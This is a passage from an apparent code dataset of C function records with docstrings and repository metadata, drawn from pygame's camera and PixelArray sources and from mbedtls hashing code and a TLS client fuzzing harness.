   break;\n        case V4L2_PIX_FMT_SBGGR8:\n            if (buffer_size >= self->size) {\n                switch (self->color_out) {\n                    case RGB_OUT:\n                        sbggr8_to_rgb(image, surf->pixels, self->width,\n                                      self->height, surf->format);\n                        break;\n                    case HSV_OUT:\n                        sbggr8_to_rgb(image, surf->pixels, self->width,\n                                      self->height, surf->format);\n                        rgb_to_hsv(surf->pixels, surf->pixels, self->size,\n                                   V4L2_PIX_FMT_SBGGR8, surf->format);\n                        break;\n                    case YUV_OUT:\n                        sbggr8_to_rgb(image, surf->pixels, self->width,\n                                      self->height, surf->format);\n                        rgb_to_yuv(surf->pixels, surf->pixels, self->size,\n                                   V4L2_PIX_FMT_SBGGR8, surf->format);\n                        break;\n                }\n            }\n            else {\n                SDL_UnlockSurface(surf);\n                return 0;\n            }\n            break;\n        case V4L2_PIX_FMT_YUV420:\n            if (buffer_size >= (self->size * 3) / 2) {\n                switch (self->color_out) {\n                    case YUV_OUT:\n                        yuv420_to_yuv(image, surf->pixels, self->width,\n                                      self->height, surf->format);\n                        break;\n                    case RGB_OUT:\n                        yuv420_to_rgb(image, surf->pixels, self->width,\n                                      self->height, surf->format);\n                        break;\n                    case HSV_OUT:\n                        yuv420_to_rgb(image, surf->pixels, self->width,\n                                      self->height, surf->format);\n                        rgb_to_hsv(surf->pixels, surf->pixels, self->size,\n                                   V4L2_PIX_FMT_YUV420, surf->format);\n                        break;\n                }\n            }\n            else {\n                SDL_UnlockSurface(surf);\n                return 0;\n            }\n            break;\n    }\n    SDL_UnlockSurface(surf);\n    return 1;\n}", "path": "pygame/src_c/camera_v4l2.c", "commit_date": "2019-10-14 00:00:00", "repo_name": "pygame/pygame", "stars": 6805, "license": "None", "language": "c", "size": 33485}
{"docstring": "/**\n * Getter for PixelArray.surface\n */\n", "func_signal": "static pgSurfaceObject *\n_pxarray_get_surface(pgPixelArrayObject *self, void *closure)", "code": "{\n    Py_INCREF(self->surface);\n    return self->surface;\n}", "path": "pygame/src_c/pixelarray.c", "commit_date": "2020-11-29 00:00:00", "repo_name": "pygame/pygame", "stars": 6805, "license": "None", "language": "c", "size": 33485}
{"docstring": "/**\n * Getter for PixelArray._pixels_address\n * (address of the array's pointer into its surface's pixel data)\n */\n", "func_signal": "static PyObject *\n_pxarray_get_pixelsaddress(pgPixelArrayObject *self, void *closure)", "code": "{\n    void *address = self->pixels;\n\n#if SIZEOF_VOID_P > SIZEOF_LONG\n    return PyLong_FromUnsignedLongLong((unsigned PY_LONG_LONG)address);\n#else\n    return PyLong_FromUnsignedLong((unsigned long)address);\n#endif\n}", "path": "pygame/src_c/pixelarray.c", "commit_date": "2020-11-29 00:00:00", "repo_name": "pygame/pygame", "stars": 6805, "license": "None", "language": "c", "size": 33485}
{"docstring": "/**** C API interfaces ****/\n", "func_signal": "static PyObject *\npgPixelArray_New(PyObject *surfobj)", "code": "{\n    SDL_Surface *surf;\n    Py_ssize_t dim0;\n    Py_ssize_t dim1;\n    Py_ssize_t stride0;\n    Py_ssize_t stride1;\n    Uint8 *pixels;\n\n    if (!pgSurface_Check(surfobj)) {\n        return RAISE(PyExc_TypeError, \"argument is not a Surface\");\n    }\n\n    surf = pgSurface_AsSurface(surfobj);\n    dim0 = (Py_ssize_t)surf->w;\n    dim1 = (Py_ssize_t)surf->h;\n    stride0 = (Py_ssize_t)surf->format->BytesPerPixel;\n    stride1 = (Py_ssize_t)surf->pitch;\n    pixels = surf->pixels;\n    if (stride0 < 1 || stride0 > 4) {\n        return RAISE(PyExc_ValueError,\n                     \"unsupported bit depth for reference array\");\n    }\n\n    return (PyObject *)_pxarray_new_internal(\n        &pgPixelArray_Type, (pgSurfaceObject *)surfobj, 0, pixels, dim0, dim1, stride0, stride1);\n}", "path": "pygame/src_c/pixelarray.c", "commit_date": "2020-11-29 00:00:00", "repo_name": "pygame/pygame", "stars": 6805, "license": "None", "language": "c", "size": 33485}
{"docstring": "/*\n * Functions for v4l2 cameras.\n * This code is based partly on pyvideograb by Laurent Pointal at\n * http://laurent.pointal.org/python/projets/pyvideograb\n * the v4l2 capture example at\n * http://www.linuxtv.org/download/video4linux/API/V4L2_API/spec/\n * and the HighGUI library in OpenCV.\n */\n", "func_signal": "int\nv4l2_xioctl(int fd, int request, void *arg)", "code": "{\n    int r;\n\n    do\n        r = ioctl(fd, request, arg);\n    while (-1 == r && EINTR == errno);\n\n    return r;\n}", "path": "pygame/src_c/camera_v4l2.c", "commit_date": "2019-10-14 00:00:00", "repo_name": "pygame/pygame", "stars": 6805, "license": "None", "language": "c", "size": 33485}
{"docstring": "/* Is video really needed for gfxdraw? */\n", "func_signal": "static int\nSint16FromObj(PyObject *item, Sint16 *val)", "code": "{\n    if (PyNumber_Check(item)) {\n        PyObject *intobj;\n        long tmp;\n\n        if (!(intobj = PyNumber_Int(item)))\n            return 0;\n        tmp = PyInt_AsLong(intobj);\n        Py_DECREF(intobj);\n        if (tmp == -1 && PyErr_Occurred())\n            return 0;\n        *val = (Sint16)tmp;\n        return 1;\n    }\n    return 0;\n}", "path": "pygame/src_c/gfxdraw.c", "commit_date": "2020-04-26 00:00:00", "repo_name": "pygame/pygame", "stars": 6805, "license": "None", "language": "c", "size": 33485}
{"docstring": "/**\n * array[x]\n */\n", "func_signal": "static PyObject *\n_pxarray_item(pgPixelArrayObject *array, Py_ssize_t index)", "code": "{\n    if (array->surface == NULL) {\n        PyErr_SetString(PyExc_ValueError, \"Operation on closed PixelArray.\");\n        return RAISE(PyExc_ValueError, \"Operation on closed PixelArray.\");\n    }\n    if (index < 0) {\n        index = array->shape[0] - index;\n        if (index < 0) {\n            return RAISE(PyExc_IndexError, \"array index out of range\");\n        }\n    }\n    if (index >= array->shape[0]) {\n        return RAISE(PyExc_IndexError, \"array index out of range\");\n    }\n    return _pxarray_subscript_internal(array, index, 0, 0, 0, array->shape[1],\n                                       1);\n}", "path": "pygame/src_c/pixelarray.c", "commit_date": "2020-11-29 00:00:00", "repo_name": "pygame/pygame", "stars": 6805, "license": "None", "language": "c", "size": 33485}
{"docstring": "/**\n * x in array\n */\n", "func_signal": "static int\n_pxarray_contains(pgPixelArrayObject *array, PyObject *value)", "code": "{\n    SDL_Surface *surf = pgSurface_AsSurface(array->surface);\n    Py_ssize_t dim0 = array->shape[0];\n    Py_ssize_t dim1 = array->shape[1];\n    Py_ssize_t stride0 = array->strides[0];\n    Py_ssize_t stride1 = array->strides[1];\n    Uint8 *pixels = array->pixels;\n    int bpp;\n    Uint32 color;\n    Uint8 *pixelrow;\n    Uint8 *pixel_p;\n    Py_ssize_t x;\n    Py_ssize_t y;\n    int found = 0;\n\n    bpp = surf->format->BytesPerPixel;\n\n    if (!_get_color_from_object(value, surf->format, &color)) {\n        return -1;\n    }\n\n    if (!dim1) {\n        dim1 = 1;\n    }\n    pixelrow = pixels;\n\n    Py_BEGIN_ALLOW_THREADS;\n    switch (bpp) {\n        case 1: {\n            Uint8 c = (Uint8)color;\n\n            for (y = 0; !found && y < dim1; ++y) {\n                pixel_p = pixelrow;\n                for (x = 0; !found && x < dim0; ++x) {\n                    found = *pixel_p == c ? 1 : 0;\n                    pixel_p += stride0;\n                }\n                pixelrow += stride1;\n            }\n        } break;\n        case 2: {\n            Uint16 c = (Uint16)color;\n\n            for (y = 0; !found && y < dim1; ++y) {\n                pixel_p = pixelrow;\n                for (x = 0; !found && x < dim0; ++x) {\n                    found = *((Uint16 *)pixel_p) == c ? 1 : 0;\n                    pixel_p += stride0;\n                }\n                pixelrow += stride1;\n            }\n        } break;\n        case 3:\n            for (y = 0; !found && y < dim1; ++y) {\n                pixel_p = pixelrow;\n                for (x = 0; !found && x < dim0; ++x) {\n#if SDL_BYTEORDER == SDL_LIL_ENDIAN\n                    found = (((Uint32)pixel_p[0]) + ((Uint32)pixel_p[1] << 8) +\n                             ((Uint32)pixel_p[2] << 16)) == color;\n#else\n                    found = (((Uint32)pixel_p[2]) + ((Uint32)pixel_p[1] << 8) +\n                             ((Uint32)pixel_p[0] << 16)) == color;\n#endif\n                    pixel_p += stride0;\n                }\n                pixelrow += stride1;\n            }\n            break;\n        default: /* case 4: */\n            for (y = 0; !found && y < dim1; ++y) {\n                pixel_p = pixelrow;\n                for (x = 0; !found && x < dim0; ++x) {\n                    found = *((Uint32 *)pixel_p) == color ? 1 : 0;\n                    pixel_p += stride0;\n                }\n                pixelrow += stride1;\n            }\n            break;\n    }\n    Py_END_ALLOW_THREADS;\n\n    return found;\n}", "path": "pygame/src_c/pixelarray.c", "commit_date": "2020-11-29 00:00:00", "repo_name": "pygame/pygame", "stars": 6805, "license": "None", "language": "c", "size": 33485}
{"docstring": "/**\n * Garbage collector support\n */\n", "func_signal": "static int\n_pxarray_traverse(pgPixelArrayObject *self, visitproc visit, void *arg)", "code": "{\n    Py_VISIT(self->surface);\n    if (self->dict) {\n        Py_VISIT(self->dict);\n    }\n    if (self->parent) {\n        Py_VISIT((PyObject *)self->parent);\n    }\n    return 0;\n}", "path": "pygame/src_c/pixelarray.c", "commit_date": "2020-11-29 00:00:00", "repo_name": "pygame/pygame", "stars": 6805, "license": "None", "language": "c", "size": 33485}
{"docstring": "/* A wrapper around a VIDIOC_S_FMT ioctl to check for format compatibility */\n", "func_signal": "int\nv4l2_pixelformat(int fd, struct v4l2_format *fmt, unsigned long pixelformat)", "code": "{\n    fmt->fmt.pix.pixelformat = pixelformat;\n\n    if (-1 == v4l2_xioctl(fd, VIDIOC_S_FMT, fmt)) {\n        return 0;\n    }\n\n    if (fmt->fmt.pix.pixelformat == pixelformat) {\n        return 1;\n    }\n    else {\n        return 0;\n    }\n}", "path": "pygame/src_c/camera_v4l2.c", "commit_date": "2019-10-14 00:00:00", "repo_name": "pygame/pygame", "stars": 6805, "license": "None", "language": "c", "size": 33485}
{"docstring": "/**\n * Deallocates the pgPixelArrayObject and its members.\n */\n", "func_signal": "static void\n_pxarray_dealloc(pgPixelArrayObject *self)", "code": "{\n    if (self->surface) {\n        if (self->weakrefs) {\n            PyObject_ClearWeakRefs((PyObject *)self);\n        }\n        _cleanup_array(self);\n    }\n    Py_TYPE(self)->tp_free((PyObject *)self);\n}", "path": "pygame/src_c/pixelarray.c", "commit_date": "2020-11-29 00:00:00", "repo_name": "pygame/pygame", "stars": 6805, "license": "None", "language": "c", "size": 33485}
{"docstring": "/**\n * Internally used parser function for the 2D slices:\n * array[x,y], array[:,:], ...\n */\n", "func_signal": "static int\n_get_subslice(PyObject *op, Py_ssize_t length, Py_ssize_t *start,\n              Py_ssize_t *stop, Py_ssize_t *step)", "code": "{\n    /* Special case: return step as 0 for an integer op.\n     */\n    *start = -1;\n    *stop = -1;\n    *step = -1;\n\n    if (PySlice_Check(op)) {\n        Py_ssize_t slicelen;\n\n        /* Operator is a slice: array[x::, */\n        if (Slice_GET_INDICES_EX(op, length, start, stop, step, &slicelen)) {\n            return -1;\n        }\n    }\n    else if (PyInt_Check(op)) {\n        /* Plain index: array[x, */\n        *start = PyInt_AsLong(op);\n        if (*start < 0) {\n            *start += length;\n        }\n        if (*start >= length || *start < 0) {\n            PyErr_SetString(PyExc_IndexError, \"invalid index\");\n            return -1;\n        }\n        *stop = (*start) + 1;\n        *step = 0;\n    }\n    else if (PyLong_Check(op)) {\n        long long val = -1;\n        /* Plain index: array[x, */\n\n        val = PyLong_AsLong(op);\n        if ((val < INT_MIN) || (val > INT_MAX)) {\n            PyErr_SetString(PyExc_ValueError,\n                            \"index too big for array access\");\n            return -1;\n        }\n        *start = (int)val;\n        if (*start < 0) {\n            *start += length;\n        }\n        if (*start >= length || *start < 0) {\n            PyErr_SetString(PyExc_IndexError, \"invalid index\");\n            return -1;\n        }\n        *stop = (*start) + 1;\n        *step = 0;\n    }\n    /* No errors. */\n    return 0;\n}", "path": "pygame/src_c/pixelarray.c", "commit_date": "2020-11-29 00:00:00", "repo_name": "pygame/pygame", "stars": 6805, "license": "None", "language": "c", "size": 33485}
{"docstring": "/**\n * Getter for PixelArray.itemsize\n * (pixel size in bytes)\n */\n", "func_signal": "static PyObject *\n_pxarray_get_itemsize(pgPixelArrayObject *self, void *closure)", "code": "{\n    SDL_Surface *surf = pgSurface_AsSurface(self->surface);\n\n    return PyInt_FromLong((long)surf->format->BytesPerPixel);\n}", "path": "pygame/src_c/pixelarray.c", "commit_date": "2020-11-29 00:00:00", "repo_name": "pygame/pygame", "stars": 6805, "license": "None", "language": "c", "size": 33485}
{"docstring": "/**\n * Slicing support for 1D and 2D access.\n * array[x,y] is only supported for 2D arrays.\n */\n", "func_signal": "static PyObject *\n_pxarray_subscript(pgPixelArrayObject *array, PyObject *op)", "code": "{\n    Py_ssize_t dim0 = array->shape[0];\n    Py_ssize_t dim1 = array->shape[1];\n\n    /* Note: order matters here.\n     * First check array[x,y], then array[x:y:z], then array[x]\n     * Otherwise it'll fail.\n     */\n    if (PyTuple_Check(op)) {\n        PyObject *obj;\n        Py_ssize_t size = PySequence_Size(op);\n        Py_ssize_t xstart, xstop, xstep;\n        Py_ssize_t ystart, ystop, ystep;\n\n        if (size == 0) {\n            /* array[,], array[()] ... */\n            Py_INCREF(array);\n            return (PyObject *)array;\n        }\n        if (size > 2 || (size == 2 && !dim1)) {\n            return RAISE(PyExc_IndexError, \"too many indices for the array\");\n        }\n\n        obj = PyTuple_GET_ITEM(op, 0);\n        if (obj == Py_Ellipsis || obj == Py_None) {\n            /* Operator is the ellipsis or None\n             * array[...,XXX], array[None,XXX]\n             */\n            xstart = 0;\n            xstop = dim0;\n            xstep = 1;\n        }\n        else if (_get_subslice(obj, dim0, &xstart, &xstop, &xstep)) {\n            /* Error on retrieving the subslice. */\n            return 0;\n        }\n\n        if (size == 2) {\n            obj = PyTuple_GET_ITEM(op, 1);\n            if (obj == Py_Ellipsis || obj == Py_None) {\n                /* Operator is the ellipsis or None\n                 * array[XXX,...], array[XXX,None]\n                 */\n                ystart = 0;\n                ystop = dim1;\n                ystep = 1;\n            }\n            else if (_get_subslice(obj, dim1, &ystart, &ystop, &ystep)) {\n                /* Error on retrieving the subslice. */\n                return 0;\n            }\n        }\n        else {\n            ystart = 0;\n            ystop = dim1;\n            ystep = 1;\n        }\n\n        /* Null value? */\n        if (xstart == xstop || ystart == ystop) {\n            Py_RETURN_NONE;\n        }\n\n        return _pxarray_subscript_internal(array, xstart, xstop, xstep, ystart,\n                                           ystop, ystep);\n    }\n    else if (op == Py_Ellipsis) {\n        Py_INCREF(array);\n        return (PyObject *)array;\n    }\n    else if (PySlice_Check(op)) {\n        /* A slice */\n        Py_ssize_t slicelen;\n        Py_ssize_t step;\n        Py_ssize_t start;\n        Py_ssize_t stop;\n\n        if (Slice_GET_INDICES_EX(op, dim0, &start, &stop, &step, &slicelen)) {\n            return 0;\n        }\n        if (slicelen < 0) {\n            return RAISE(PyExc_IndexError, \"Unable to handle negative slice\");\n        }\n        if (slicelen == 0) {\n            Py_RETURN_NONE;\n        }\n        return _pxarray_subscript_internal(array, start, stop, step, 0, dim1,\n                                           1);\n    }\n    else if (PyIndex_Check(op) || INT_CHECK(op)) {\n        Py_ssize_t i;\n        PyObject *val = PyNumber_Index(op);\n        if (!val) {\n            return 0;\n        }\n        /* A simple index. */\n        i = PyNumber_AsSsize_t(val, PyExc_IndexError);\n        Py_DECREF(val);\n        if (i == -1 && PyErr_Occurred()) {\n            return 0;\n        }\n        if (i < 0) {\n            i += dim0;\n        }\n        if (i < 0 || i >= dim0) {\n            return RAISE(PyExc_IndexError, \"array index out of range\");\n        }\n        return _pxarray_subscript_internal(array, i, i + 1, 0, 0, dim1, 1);\n    }\n\n    return RAISE(PyExc_TypeError,\n                 \"index must be an integer, sequence or slice\");\n}", "path": "pygame/src_c/pixelarray.c", "commit_date": "2020-11-29 00:00:00", "repo_name": "pygame/pygame", "stars": 6805, "license": "None", "language": "c", "size": 33485}
{"docstring": "/* returns a string of the buffer from the camera */\n/* TODO: fold this into the regular read_frame. lots of duplicate code */\n", "func_signal": "PyObject *\nv4l2_read_raw(pgCameraObject *self)", "code": "{\n    struct v4l2_buffer buf;\n    PyObject *raw;\n\n    CLEAR(buf);\n\n    buf.type = V4L2_BUF_TYPE_VIDEO_CAPTURE;\n    buf.memory = V4L2_MEMORY_MMAP;\n\n    if (-1 == v4l2_xioctl(self->fd, VIDIOC_DQBUF, &buf)) {\n        PyErr_Format(PyExc_SystemError, \"ioctl(VIDIOC_DQBUF) failure : %d, %s\",\n                     errno, strerror(errno));\n        return NULL;\n    }\n\n    assert(buf.index < self->n_buffers);\n\n    raw = Bytes_FromStringAndSize(self->buffers[buf.index].start,\n                                  self->buffers[buf.index].length);\n\n    if (-1 == v4l2_xioctl(self->fd, VIDIOC_QBUF, &buf)) {\n        PyErr_Format(PyExc_SystemError, \"ioctl(VIDIOC_QBUF) failure : %d, %s\",\n                     errno, strerror(errno));\n        return NULL;\n    }\n    return raw;\n}", "path": "pygame/src_c/camera_v4l2.c", "commit_date": "2019-10-14 00:00:00", "repo_name": "pygame/pygame", "stars": 6805, "license": "None", "language": "c", "size": 33485}
{"docstring": "/**\n * Creates a 2D slice of the array.\n */\n", "func_signal": "static PyObject *\n_array_slice_internal(pgPixelArrayObject *array, Py_ssize_t start,\n                      Py_ssize_t end, Py_ssize_t step)", "code": "{\n    if (array->surface == NULL) {\n        return RAISE(PyExc_ValueError, \"Operation on closed PixelArray.\");\n    }\n    if (end == start) {\n        return RAISE(PyExc_IndexError, \"array size must not be 0\");\n    }\n\n    if (start >= array->shape[0]) {\n        return RAISE(PyExc_IndexError, \"array index out of range\");\n    }\n    return _pxarray_subscript_internal(array, start, end, step, 0,\n                                       array->shape[1], 1);\n}", "path": "pygame/src_c/pixelarray.c", "commit_date": "2020-11-29 00:00:00", "repo_name": "pygame/pygame", "stars": 6805, "license": "None", "language": "c", "size": 33485}
{"docstring": "/**\n * array[x] = ...\n */\n", "func_signal": "static int\n_pxarray_ass_item(pgPixelArrayObject *array, Py_ssize_t index, PyObject *value)", "code": "{\n    SDL_Surface *surf = pgSurface_AsSurface(array->surface);\n    Py_ssize_t y = 0;\n    int bpp;\n    Uint8 *pixels = array->pixels;\n    Uint8 *pixel_p;\n    Uint32 color = 0;\n    Py_ssize_t dim0 = array->shape[0];\n    Py_ssize_t dim1 = array->shape[1];\n    Py_ssize_t stride0 = array->strides[0];\n    Py_ssize_t stride1 = array->strides[1];\n\n    bpp = surf->format->BytesPerPixel;\n\n    if (!_get_color_from_object(value, surf->format, &color)) {\n        if (PyTuple_Check(value)) {\n            return -1;\n        }\n        if (pgPixelArrayObject_Check(value)) {\n            PyErr_Clear(); /* _get_color_from_object */\n            return _array_assign_array(array, index, index + 1,\n                                       (pgPixelArrayObject *)value);\n        }\n        else if (PySequence_Check(value)) {\n            pgPixelArrayObject *tmparray = 0;\n            int retval;\n\n            PyErr_Clear(); /* _get_color_from_object */\n            tmparray = (pgPixelArrayObject *)_pxarray_subscript_internal(\n                array, index, 0, 0, 0, array->shape[1], 1);\n            if (!tmparray) {\n                return -1;\n            }\n            retval =\n                _array_assign_sequence(tmparray, 0, tmparray->shape[0], value);\n            Py_DECREF(tmparray);\n            return retval;\n        }\n        else { /* Error already set by _get_color_from_object(). */\n            return -1;\n        }\n    }\n\n    if (index < 0) {\n        index += dim0;\n        if (index < 0) {\n            PyErr_SetString(PyExc_IndexError, \"array index out of range\");\n            return -1;\n        }\n    }\n    if (index >= dim0) {\n        PyErr_SetString(PyExc_IndexError, \"array index out of range\");\n    }\n    pixels += index * stride0;\n\n    pixel_p = pixels;\n    if (!dim1) {\n        dim1 = 1;\n    }\n\n    Py_BEGIN_ALLOW_THREADS;\n    /* Single value assignment. */\n    switch (bpp) {\n        case 1:\n            for (y = 0; y < dim1; ++y) {\n                *((Uint8 *)pixel_p) = (Uint8)color;\n                pixel_p += stride1;\n            }\n            break;\n        case 2:\n            for (y = 0; y < dim1; ++y) {\n                *((Uint16 *)pixel_p) = (Uint16)color;\n                pixel_p += stride1;\n            }\n            break;\n        case 3: {\n#if (SDL_BYTEORDER == SDL_LIL_ENDIAN)\n            Uint32 Roffset = surf->format->Rshift >> 3;\n            Uint32 Goffset = surf->format->Gshift >> 3;\n            Uint32 Boffset = surf->format->Bshift >> 3;\n#else\n            Uint32 Roffset = 2 - (surf->format->Rshift >> 3);\n            Uint32 Goffset = 2 - (surf->format->Gshift >> 3);\n            Uint32 Boffset = 2 - (surf->format->Bshift >> 3);\n#endif\n            for (y = 0; y < dim1; ++y) {\n                pixel_p[Roffset] = (Uint8)(color >> 16);\n                pixel_p[Goffset] = (Uint8)(color >> 8);\n                pixel_p[Boffset] = (Uint8)color;\n                pixel_p += stride1;\n            }\n            break;\n        }\n        default: /* case 4: */\n            for (y = 0; y < dim1; ++y) {\n                *((Uint32 *)pixel_p) = color;\n                pixel_p += stride1;\n            }\n            break;\n    }\n    Py_END_ALLOW_THREADS;\n\n    return 0;\n}", "path": "pygame/src_c/pixelarray.c", "commit_date": "2020-11-29 00:00:00", "repo_name": "pygame/pygame", "stars": 6805, "license": "None", "language": "c", "size": 33485}
{"docstring": "/* gets the value of a specific camera control if available */\n", "func_signal": "int\nv4l2_get_control(int fd, int id, int *value)", "code": "{\n    struct v4l2_control control;\n    CLEAR(control);\n\n    control.id = id;\n\n    if (-1 == v4l2_xioctl(fd, VIDIOC_G_CTRL, &control)) {\n        return 0;\n    }\n\n    *value = control.value;\n    return 1;\n}", "path": "pygame/src_c/camera_v4l2.c", "commit_date": "2019-10-14 00:00:00", "repo_name": "pygame/pygame", "stars": 6805, "license": "None", "language": "c", "size": 33485}
{"docstring": "/* sets a control if supported. the camera may round the value */\n", "func_signal": "int\nv4l2_set_control(int fd, int id, int value)", "code": "{\n    struct v4l2_control control;\n    CLEAR(control);\n\n    control.id = id;\n    control.value = value;\n\n    if (-1 == v4l2_xioctl(fd, VIDIOC_S_CTRL, &control)) {\n        return 0;\n    }\n\n    return 1;\n}", "path": "pygame/src_c/camera_v4l2.c", "commit_date": "2019-10-14 00:00:00", "repo_name": "pygame/pygame", "stars": 6805, "license": "None", "language": "c", "size": 33485}
{"docstring": "/*\n * SHA-1 process buffer\n */\n", "func_signal": "int mbedtls_sha1_update_ret( mbedtls_sha1_context *ctx,\n                             const unsigned char *input,\n                             size_t ilen )", "code": "{\n    int ret = MBEDTLS_ERR_ERROR_CORRUPTION_DETECTED;\n    size_t fill;\n    uint32_t left;\n\n    SHA1_VALIDATE_RET( ctx != NULL );\n    SHA1_VALIDATE_RET( ilen == 0 || input != NULL );\n\n    if( ilen == 0 )\n        return( 0 );\n\n    left = ctx->total[0] & 0x3F;\n    fill = 64 - left;\n\n    ctx->total[0] += (uint32_t) ilen;\n    ctx->total[0] &= 0xFFFFFFFF;\n\n    if( ctx->total[0] < (uint32_t) ilen )\n        ctx->total[1]++;\n\n    if( left && ilen >= fill )\n    {\n        memcpy( (void *) (ctx->buffer + left), input, fill );\n\n        if( ( ret = mbedtls_internal_sha1_process( ctx, ctx->buffer ) ) != 0 )\n            return( ret );\n\n        input += fill;\n        ilen  -= fill;\n        left = 0;\n    }\n\n    while( ilen >= 64 )\n    {\n        if( ( ret = mbedtls_internal_sha1_process( ctx, input ) ) != 0 )\n            return( ret );\n\n        input += 64;\n        ilen  -= 64;\n    }\n\n    if( ilen > 0 )\n        memcpy( (void *) (ctx->buffer + left), input, ilen );\n\n    return( 0 );\n}", "path": "mbedtls/library/sha1.c", "commit_date": "2020-09-18 00:00:00", "repo_name": "Mbed-TLS/mbedtls", "stars": 4802, "license": "other", "language": "c", "size": 118468}
{"docstring": "/*\n * Checkup routine\n */\n", "func_signal": "int mbedtls_md5_self_test( int verbose )", "code": "{\n    int i, ret = 0;\n    unsigned char md5sum[16];\n\n    for( i = 0; i < 7; i++ )\n    {\n        if( verbose != 0 )\n            mbedtls_printf( \"  MD5 test #%d: \", i + 1 );\n\n        ret = mbedtls_md5_ret( md5_test_buf[i], md5_test_buflen[i], md5sum );\n        if( ret != 0 )\n            goto fail;\n\n        if( memcmp( md5sum, md5_test_sum[i], 16 ) != 0 )\n        {\n            ret = 1;\n            goto fail;\n        }\n\n        if( verbose != 0 )\n            mbedtls_printf( \"passed\\n\" );\n    }\n\n    if( verbose != 0 )\n        mbedtls_printf( \"\\n\" );\n\n    return( 0 );\n\nfail:\n    if( verbose != 0 )\n        mbedtls_printf( \"failed\\n\" );\n\n    return( ret );\n}", "path": "mbedtls/library/md5.c", "commit_date": "2020-12-03 00:00:00", "repo_name": "Mbed-TLS/mbedtls", "stars": 4802, "license": "other", "language": "c", "size": 118468}
{"docstring": "/* MBEDTLS_SSL_CLI_C && MBEDTLS_ENTROPY_C && MBEDTLS_CTR_DRBG_C */\n", "func_signal": "int LLVMFuzzerTestOneInput(const uint8_t *Data, size_t Size)", "code": "{\n#if defined(MBEDTLS_SSL_CLI_C) && \\\n    defined(MBEDTLS_ENTROPY_C) && \\\n    defined(MBEDTLS_CTR_DRBG_C)\n    int ret;\n    size_t len;\n    mbedtls_ssl_context ssl;\n    mbedtls_ssl_config conf;\n    mbedtls_ctr_drbg_context ctr_drbg;\n    mbedtls_entropy_context entropy;\n    unsigned char buf[4096];\n    fuzzBufferOffset_t biomemfuzz;\n    uint16_t options;\n\n    if (initialized == 0) {\n#if defined(MBEDTLS_X509_CRT_PARSE_C) && defined(MBEDTLS_PEM_PARSE_C)\n        mbedtls_x509_crt_init( &cacert );\n        if (mbedtls_x509_crt_parse( &cacert, (const unsigned char *) mbedtls_test_cas_pem,\n                                   mbedtls_test_cas_pem_len ) != 0)\n            return 1;\n#endif\n\n        alpn_list[0] = \"HTTP\";\n        alpn_list[1] = \"fuzzalpn\";\n        alpn_list[2] = NULL;\n\n        dummy_init();\n\n        initialized = 1;\n    }\n\n    //we take 1 byte as options input\n    if (Size < 2) {\n        return 0;\n    }\n    options = (Data[Size - 2] << 8) | Data[Size - 1];\n    //Avoid warnings if compile options imply no options\n    (void) options;\n\n    mbedtls_ssl_init( &ssl );\n    mbedtls_ssl_config_init( &conf );\n    mbedtls_ctr_drbg_init( &ctr_drbg );\n    mbedtls_entropy_init( &entropy );\n\n    if( mbedtls_ctr_drbg_seed( &ctr_drbg, dummy_entropy, &entropy,\n                              (const unsigned char *) pers, strlen( pers ) ) != 0 )\n        goto exit;\n\n    if( mbedtls_ssl_config_defaults( &conf,\n                                    MBEDTLS_SSL_IS_CLIENT,\n                                    MBEDTLS_SSL_TRANSPORT_STREAM,\n                                    MBEDTLS_SSL_PRESET_DEFAULT ) != 0 )\n        goto exit;\n\n#if defined(MBEDTLS_KEY_EXCHANGE_SOME_PSK_ENABLED)\n    if (options & 2) {\n        mbedtls_ssl_conf_psk( &conf, psk, sizeof( psk ),\n                             (const unsigned char *) psk_id, sizeof( psk_id ) - 1 );\n    }\n#endif\n\n#if defined(MBEDTLS_X509_CRT_PARSE_C) && defined(MBEDTLS_PEM_PARSE_C)\n    if (options & 4) {\n        mbedtls_ssl_conf_ca_chain( &conf, &cacert, NULL );\n        mbedtls_ssl_conf_authmode( &conf, MBEDTLS_SSL_VERIFY_REQUIRED );\n    } else\n#endif\n    {\n        mbedtls_ssl_conf_authmode( &conf, MBEDTLS_SSL_VERIFY_NONE );\n    }\n#if defined(MBEDTLS_SSL_TRUNCATED_HMAC)\n    mbedtls_ssl_conf_truncated_hmac( &conf, (options & 8) ? MBEDTLS_SSL_TRUNC_HMAC_ENABLED : MBEDTLS_SSL_TRUNC_HMAC_DISABLED);\n#endif\n#if defined(MBEDTLS_SSL_EXTENDED_MASTER_SECRET)\n    mbedtls_ssl_conf_extended_master_secret( &conf, (options & 0x10) ? MBEDTLS_SSL_EXTENDED_MS_DISABLED : MBEDTLS_SSL_EXTENDED_MS_ENABLED);\n#endif\n#if defined(MBEDTLS_SSL_ENCRYPT_THEN_MAC)\n    mbedtls_ssl_conf_encrypt_then_mac( &conf, (options & 0x20) ? MBEDTLS_SSL_ETM_DISABLED : MBEDTLS_SSL_ETM_ENABLED);\n#endif\n#if defined(MBEDTLS_SSL_CBC_RECORD_SPLITTING)\n    mbedtls_ssl_conf_cbc_record_splitting( &conf, (options & 0x40) ? MBEDTLS_SSL_CBC_RECORD_SPLITTING_ENABLED : MBEDTLS_SSL_CBC_RECORD_SPLITTING_DISABLED );\n#endif\n#if defined(MBEDTLS_SSL_RENEGOTIATION)\n    mbedtls_ssl_conf_renegotiation( &conf, (options & 0x80) ? MBEDTLS_SSL_RENEGOTIATION_ENABLED : MBEDTLS_SSL_RENEGOTIATION_DISABLED );\n#endif\n#if defined(MBEDTLS_SSL_SESSION_TICKETS)\n    mbedtls_ssl_conf_session_tickets( &conf, (options & 0x100) ? MBEDTLS_SSL_SESSION_TICKETS_DISABLED : MBEDTLS_SSL_SESSION_TICKETS_ENABLED );\n#endif\n#if defined(MBEDTLS_SSL_ALPN)\n    if (options & 0x200) {\n        mbedtls_ssl_conf_alpn_protocols( &conf, alpn_list );\n    }\n#endif\n    //There may be other options to add :\n    // mbedtls_ssl_conf_cert_profile, mbedtls_ssl_conf_sig_hashes\n\n    srand(1);\n    mbedtls_ssl_conf_rng( &conf, dummy_random, &ctr_drbg );\n\n    if( mbedtls_ssl_setup( &ssl, &conf ) != 0 )\n        goto exit;\n\n#if defined(MBEDTLS_X509_CRT_PARSE_C) && defined(MBEDTLS_PEM_PARSE_C)\n    if ((options & 1) == 0) {\n        if( mbedtls_ssl_set_hostname( &ssl, \"localhost\" ) != 0 )\n            goto exit;\n    }\n#endif\n\n    biomemfuzz.Data = Data;\n    biomemfuzz.Size = Size-2;\n    biomemfuzz.Offset = 0;\n    mbedtls_ssl_set_bio( &ssl, &biomemfuzz, dummy_send, fuzz_recv, NULL );\n\n    ret = 